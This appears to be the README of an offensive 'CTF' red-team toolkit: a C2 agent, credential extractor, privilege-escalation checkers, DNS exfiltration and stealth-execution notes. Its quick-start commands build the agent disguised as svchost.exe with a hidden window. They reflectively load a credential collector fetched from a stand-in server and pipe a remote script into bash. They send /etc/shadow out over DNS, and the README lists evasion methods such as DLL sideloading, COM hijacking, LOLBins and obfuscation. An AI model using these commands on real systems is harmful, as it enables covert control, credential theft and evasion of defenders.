# CTF Toolkit v2

Multi-language red team toolkit. Every tool exists in its optimal language for stealth,
reliability, and minimal target dependencies. Python originals preserved in `python/`.

---

## Language Choices At a Glance

| Tool | Python (original) | Rewritten as | Why |
|------|-------------------|-------------|-----|
| C2 agent | `python/c2_agent.py` | `go/agent/` | Single compiled binary, no runtime needed, hard to reverse |
| C2 server | `python/c2_server.py` | Keep Python | Runs on your machine — doesn't matter |
| Pivot relay | `python/tunnel.py` | `go/tunnel/` | Compiled binary, fast; also see Chisel |
| Credential extractor | `python/ctf_hunter.py` | `csharp/Hunter.cs` | Native Windows APIs, no pip install, reflective loadable |
| Linux privesc | `python/sysaudit.py` | `bash/sysaudit.sh` | Runs on any Linux, curl-pipe delivery |
| Windows privesc | `python/wincheck.py` | `powershell/WinCheck.ps1` | Already on Windows, no install |
| DNS exfil receiver | `python/dnsout.py recv` | Keep Python | Runs on your machine |
| DNS exfil sender | `python/dnsout.py send` | `bash/dnsout_send.sh` + `powershell/DnsOut-Send.ps1` | No Python on target |
| Payload generator | `python/payload_gen.py` | Keep Python | Runs on your machine |
| Flag hunters | `python/find_flags.py`, `python/Find-Flags.ps1` | Keep | Already well-suited |
| Receiver | `python/receive.py` | Keep Python | Runs on your machine |

---

## Repository Structure

```
ctf-toolkit/
├── go/
│   ├── agent/          C2 agent (Go) — cross-compile to any OS/arch
│   └── tunnel/         TCP forwarder / bind relay / SOCKS5 (Go)
├── csharp/
│   └── Hunter.cs       Credential extractor (C#) — compile as EXE or DLL
├── powershell/
│   ├── WinCheck.ps1    Windows privesc checker (native PS)
│   └── DnsOut-Send.ps1 DNS exfil sender for Windows
├── bash/
│   ├── sysaudit.sh     Linux privesc checker (pure bash)
│   └── dnsout_send.sh  DNS exfil sender for Linux
├── python/             All original Python tools (unchanged)
└── docs/
    ├── GO_GUIDE.md         Build, obfuscate, run Go tools
    ├── CHISEL_GUIDE.md     Chisel usage + comparison with tunnel.go
    └── STEALTH_EXECUTION.md DLL sideloading, reflective loading, COM hijacking, LOLBins
```

---

## Quick Start

### Go tools — build

```bash
# Install Go
sudo apt install golang-go   # or https://go.dev/dl/

# Build agent for Windows (from Linux)
cd go/agent
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H windowsgui" -trimpath -o svchost.exe .

# Build tunnel for Linux
cd go/tunnel
go build -ldflags "-s -w" -trimpath -o tunnel .
```

See **[docs/GO_GUIDE.md](docs/GO_GUIDE.md)** for obfuscation with garble, all targets, persistence.

### C# Hunter — compile

```cmd
# On Windows — using .NET's built-in compiler
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:Hunter.exe csharp\Hunter.cs

# Or reflective load (never touches disk as EXE)
$b = (New-Object Net.WebClient).DownloadData('http://yourserver/Hunter.dll')
[Reflection.Assembly]::Load($b) | Out-Null
[Hunter.Collector]::Run("http://yourserver:8000")
```

### PowerShell WinCheck

```powershell
powershell -ExecutionPolicy Bypass -File .\powershell\WinCheck.ps1
.\powershell\WinCheck.ps1 -Section tokens
.\powershell\WinCheck.ps1 -Fast -Out C:\Temp\report.txt
```

### Bash sysaudit (Linux)

```bash
# Direct run
bash bash/sysaudit.sh

# One-liner from your server — no file needed on target
curl -s http://yourserver/sysaudit.sh | bash

# With options
bash sysaudit.sh --fast --out /tmp/report.txt
bash sysaudit.sh --section sudo
```

### DNS exfil

```bash
# Receiver on your machine (Python)
python3 python/dnsout.py recv --port 5353

# Sender on Linux target (bash — no Python needed)
bash bash/dnsout_send.sh 10.10.14.5 exfil.yourdomain.com /etc/shadow

# Sender on Windows target (PowerShell)
.\powershell\DnsOut-Send.ps1 -Server 10.10.14.5 -Command "whoami /all"
```

---

## Stealth Execution

Don't just drop an EXE. See **[docs/STEALTH_EXECUTION.md](docs/STEALTH_EXECUTION.md)** for:

- **DLL sideloading** — place your DLL in a writable app directory
- **DLL proxying** — forward all calls to real DLL while running payload
- **Reflective DLL loading** — load C# assembly directly from memory via PowerShell
- **AppDomainManager injection** — hijack any .NET process without touching its files
- **COM object hijacking** — intercept COM calls from trusted applications
- **LOLBins** — use `msbuild.exe`, `regsvr32.exe`, `certutil.exe` etc. to avoid custom binaries

---

## Docs

| File | Contents |
|------|---------|
| [docs/GO_GUIDE.md](docs/GO_GUIDE.md) | Go install, build flags, cross-compilation, garble obfuscation, persistence |
| [docs/CHISEL_GUIDE.md](docs/CHISEL_GUIDE.md) | Chisel download, common scenarios, vs tunnel.go |
| [docs/STEALTH_EXECUTION.md](docs/STEALTH_EXECUTION.md) | DLL sideloading, proxying, reflective loading, COM hijacking, LOLBins |
